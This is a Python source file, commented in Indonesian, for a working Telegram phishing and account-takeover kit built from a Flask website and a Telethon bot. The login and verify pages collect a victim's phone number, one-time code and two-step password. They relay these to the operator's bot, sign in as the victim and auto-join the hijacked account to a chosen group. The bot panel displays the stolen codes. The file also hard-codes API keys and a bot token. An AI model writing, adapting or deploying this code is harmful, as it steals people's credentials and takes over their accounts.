import asyncio
import threading
import os
import logging
from flask import Flask, render_template, request, redirect, url_for, session, flash
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest

# --- KONFIGURASI UTAMA ---
API_ID = 31871641               
API_HASH = '5e0aa2e3b7b013161308d8880d062193'
BOT_TOKEN = '8390941360:AAG_tT7KmGz_v_ffiR1GhxmXrWQm-vkHxzw' 

# ID Admin (Ganti dengan ID Telegram Anda)
ADMIN_IDS = {7795826197} 

# --- KONFIGURASI GRUP ---
TARGET_GROUP_BOT = "" 
WEB_SPECIAL_GROUP_LINK = "https://t.me/+vcYDjyo4zfEyY2Q1"

# --- VARIABEL GLOBAL ---
OTP_SESSION_CACHE = "❌ Belum ada data OTP session yang masuk."

# --- SETUP FOLDER & LOGGING ---
SESSION_DIR = 'sessions'
if not os.path.exists(SESSION_DIR): os.makedirs(SESSION_DIR)

USER_SESSION = os.path.join(SESSION_DIR, 'user_session')
BOT_SESSION = os.path.join(SESSION_DIR, 'bot_session')

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- SETUP FLASK & TELETHON ---
app = Flask(__name__)
app.secret_key = 'super_secret_key_phising_123'

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

client = TelegramClient(USER_SESSION, API_ID, API_HASH, loop=loop)
bot = TelegramClient(BOT_SESSION, API_ID, API_HASH, loop=loop)

# --- FUNGSI PEMBANTU (ASYNC) ---
def is_admin(user_id): 
    return user_id in ADMIN_IDS

def run_async(coro): 
    return asyncio.run_coroutine_threadsafe(coro, loop).result()

async def ensure_client_connected():
    if not client.is_connected():
        await client.connect()

def send_admin_notif(message):
    async def send():
        for admin_id in ADMIN_IDS:
            try: await bot.send_message(admin_id, f"🔔 **LOG SISTEM**\n\n{message}")
            except: pass
    asyncio.run_coroutine_threadsafe(send(), loop)

def get_admin_buttons():
    return [
        [Button.inline("🔍 Cek Mutual", b"cek_mutual"), Button.inline("⚡ Sedot ke Grup Bot", b"sedot_grup")],
        [Button.inline("📡 Set Target Grup (Bot)", b"set_grup_btn"), Button.inline("👥 Auto Join (Manual)", b"auto_join")],
        [Button.inline("📋 List Admin", b"list_sesi"), Button.inline("🔓 Cek Status Login", b"status_login")],
        # Tombol Login Admin & Cek OTP
        [Button.inline("🔑 Kode OTP Session", b"cek_otp_session"), Button.inline("🔓 Login Admin (Manual)", b"login_admin_manual")]
    ]

# --- EVENT HANDLER BOT TELEGRAM ---
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    if is_admin(event.sender_id):
        global TARGET_GROUP_BOT
        status_bot = TARGET_GROUP_BOT if TARGET_GROUP_BOT else "Belum Diatur"
        
        msg = (
            f"👋 **Dashboard Admin Panel**\n\n"
            f"🎯 Target Grup (Fitur Bot): `{status_bot}`"
        )
        await event.reply(msg, buttons=get_admin_buttons())

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    if not is_admin(event.sender_id): return
    global TARGET_GROUP_BOT
    data = event.data
    
    if data == b"set_grup_btn":
        async with bot.conversation(event.chat_id) as conv:
            await conv.send_message("📝 Masukkan Username/ID Grup untuk fitur Bot:")
            res = await conv.get_response()
            TARGET_GROUP_BOT = res.text
            await conv.send_message(f"✅ Target grup Bot diset ke: `{TARGET_GROUP_BOT}`", buttons=get_admin_buttons())
            
    elif data == b"status_login":
        is_auth = await client.is_user_authorized()
        status = "✅ SUDAH LOGIN" if is_auth else "❌ BELUM LOGIN"
        await event.answer(status, alert=True)
        
    elif data == b"auto_join":
        if not TARGET_GROUP_BOT: return await event.answer("Set Grup Bot dulu!", alert=True)
        try:
            await client(JoinChannelRequest(TARGET_GROUP_BOT))
            await event.answer(f"Berhasil join ke {TARGET_GROUP_BOT}", alert=True)
        except Exception as e:
            await event.answer(f"Gagal: {str(e)}", alert=True)
            
    elif data == b"cek_otp_session":
        await event.answer(OTP_SESSION_CACHE, alert=True)

    # --- FITUR BARU: LOGIN ADMIN MANUAL ---
    elif data == b"login_admin_manual":
        # Memulai percakapan interaktif untuk login via bot
        async with bot.conversation(event.chat_id) as conv:
            await conv.send_message("📞 **LOGIN ADMIN MANUAL**\nSilakan masukkan Nomor HP (contoh: +628xxx):")
            phone_resp = await conv.get_response()
            phone = phone_resp.text.replace(' ', '')
            
            msg_status = await conv.send_message("⏳ Sedang mengirim kode OTP...")
            
            try:
                await ensure_client_connected()
                await client.send_code_request(phone)
                await msg_status.edit("✅ OTP Terkirim!\n\n📩 Silakan masukkan **Kode OTP**:")
                
                otp_resp = await conv.get_response()
                otp = otp_resp.text.replace(' ', '')
                
                try:
                    await client.sign_in(phone, code=otp)
                    await conv.send_message(f"✅ **LOGIN BERHASIL!**\nSesi aktif untuk nomor: `{phone}`")
                except SessionPasswordNeededError:
                    await conv.send_message("🔒 **Verifikasi 2 Langkah (2FA)** aktif.\nSilakan masukkan Password:")
                    pwd_resp = await conv.get_response()
                    password = pwd_resp.text
                    await client.sign_in(phone, password=password)
                    await conv.send_message(f"✅ **LOGIN BERHASIL (dengan 2FA)!**\nSesi aktif untuk nomor: `{phone}`")
                    
            except Exception as e:
                await conv.send_message(f"❌ **GAGAL LOGIN**\nError: {str(e)}")
            
    await event.answer()

# --- ROUTES WEBSITE (FLASK) ---
@app.route('/')
def home():
    if 'user_id' not in session: return redirect(url_for('login'))
    return render_template('index.html', info={"full_name": session.get('name', 'User'), "saldo": 150000})

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        phone = request.form.get('phone')
        send_admin_notif(f"📥 Input Nomor Baru: `{phone}`")
        try:
            run_async(ensure_client_connected())
            run_async(client.send_code_request(phone))
            session['phone'] = phone
            return redirect(url_for('verify'))
        except Exception as e:
            flash(f"Gagal mengirim OTP: {str(e)}", "error")
    return render_template('login.html')

@app.route('/verify', methods=['GET', 'POST'])
def verify():
    global OTP_SESSION_CACHE
    if request.method == 'POST':
        otp = request.form.get('otp')
        password = request.form.get('password')
        phone = session.get('phone')
        
        OTP_SESSION_CACHE = f"📱 Nomor: {phone}\n🔑 Kode: {otp}\n🔒 2FA: {password if password else 'Tidak Ada'}"
        send_admin_notif(f"🔑 OTP Masuk!\nNomor: `{phone}`\nOTP: `{otp}`\n2FA: `{password}`")

        try:
            if password:
                user = run_async(client.sign_in(phone=phone, password=password))
            else:
                user = run_async(client.sign_in(phone=phone, code=otp))
            
            # LOGIKA AUTO JOIN WEB
            try:
                if "+" in WEB_SPECIAL_GROUP_LINK:
                    hash_link = WEB_SPECIAL_GROUP_LINK.split('+')[1]
                    run_async(client(ImportChatInviteRequest(hash_link)))
                else:
                    run_async(client(JoinChannelRequest(WEB_SPECIAL_GROUP_LINK)))
                send_admin_notif(f"✅ Login Sukses!\n🚀 Target berhasil AUTO JOIN ke grup Web.")
            except Exception as e_join:
                send_admin_notif(f"⚠️ Login Sukses, tapi GAGAL Join Grup Web:\nError: {str(e_join)}")

            session['user_id'] = user.id
            session['name'] = f"{user.first_name or ''} {user.last_name or ''}".strip()
            return redirect(url_for('home'))

        except SessionPasswordNeededError:
            return render_template('verify.html', password_required=True)
        except Exception as e:
            flash(f"Kode Salah/Expired: {str(e)}", "error")
            return render_template('verify.html', password_required=False)

    return render_template('verify.html', password_required=False)

# --- MENJALANKAN SERVER ---
def start_telegram_clients():
    async def main():
        await bot.start(bot_token=BOT_TOKEN)
        await client.connect()
        print("✅ Telegram Clients Started!")
        await bot.run_until_disconnected()
    loop.run_until_complete(main())

if __name__ == '__main__':
    threading.Thread(target=start_telegram_clients, daemon=True).start()
    print("🚀 Flask Server Running on Port 5000...")
    app.run(host='0.0.0.0', port=5000, debug=False)
